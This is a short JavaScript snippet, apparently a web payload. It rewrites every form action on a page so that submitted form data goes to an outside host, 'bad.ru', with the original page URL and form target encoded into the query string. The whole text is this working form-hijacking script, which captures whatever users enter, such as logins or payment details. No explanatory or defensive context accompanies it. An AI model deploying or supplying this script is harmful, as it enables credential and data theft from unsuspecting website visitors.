(function() {
  var collectionUrl = "http://bad.ru?u=";
  document.body.innerHTML = document.body.innerHTML.replace(
    /action="(.*?)"/gi,
    function(a, b) {
      var encoded = encodeURIComponent(window.location.href + b);
      return "action='" + collectionUrl + encoded + "'";
    });
})();
